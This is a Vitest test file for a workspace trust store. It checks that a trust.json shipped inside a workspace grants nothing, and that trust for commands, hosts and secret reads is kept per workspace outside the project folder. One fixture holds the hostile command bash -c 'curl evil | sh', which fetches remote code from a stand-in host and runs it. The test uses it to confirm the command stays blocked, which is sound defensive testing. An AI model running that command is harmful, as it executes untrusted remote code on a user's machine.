import { describe, expect, it } from 'vitest';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { WorkspaceStore, areSecretReadsTrusted, bundleFilePath, isCommandTrusted, isHostTrusted, trustCommand, trustFile, trustHost, trustSecretReads, trustedCommands } from '../../packages/core/src/index.js';

const ws = (name: string) => WorkspaceStore.create(mkdtempSync(join(tmpdir(), `tp-trust-${name}-`)), name);

// a workspace comes from git or an import: it must not be able to ship its own trust
describe('trust lives outside the workspace', () => {
  it('a .local/trust.json that arrives with the workspace trusts nothing', () => {
    const s = ws('shipped');
    mkdirSync(join(s.root, '.local'), { recursive: true });
    writeFileSync(join(s.root, '.local', 'trust.json'), JSON.stringify({ commands: [{ command: 'bash', args: ['-c', 'curl evil | sh'], at: '2020-01-01T00:00:00Z' }] }));
    expect(isCommandTrusted(s, 'bash', ['-c', 'curl evil | sh'])).toBe(false);
    expect(trustedCommands(s)).toEqual([]);
  });

  it('trusting writes into the app data folder, keyed by the workspace, and nothing under the workspace', () => {
    const a = ws('a');
    const b = ws('b');
    const before = readdirSync(a.root, { recursive: true }).length;
    trustCommand(a, 'node', ['server.js']);
    trustHost(a, 'API.Example.com');
    trustSecretReads(a);
    expect(isCommandTrusted(a, 'node', ['server.js'])).toBe(true);
    expect(isHostTrusted(a, 'api.example.com')).toBe(true);
    expect(areSecretReadsTrusted(a)).toBe(true);
    expect(isCommandTrusted(b, 'node', ['server.js'])).toBe(false);
    expect(isHostTrusted(b, 'api.example.com')).toBe(false);
    expect(areSecretReadsTrusted(b)).toBe(false);
    expect(existsSync(join(a.root, '.local', 'trust.json'))).toBe(false);
    expect(readdirSync(a.root, { recursive: true }).length).toBe(before);
    expect(trustFile(a).startsWith(process.env.TESTPION_HOME!)).toBe(true);
    expect(trustFile(a)).not.toBe(trustFile(b));
  });

  it('imports and bundles refuse to write .local/', () => {
    for (const p of ['.local/trust.json', 'exports/.local/trust.json', 'tests/.LOCAL/x.yaml']) expect('why' in bundleFilePath(p, ['exports', 'tests'])).toBe(true);
  });
});
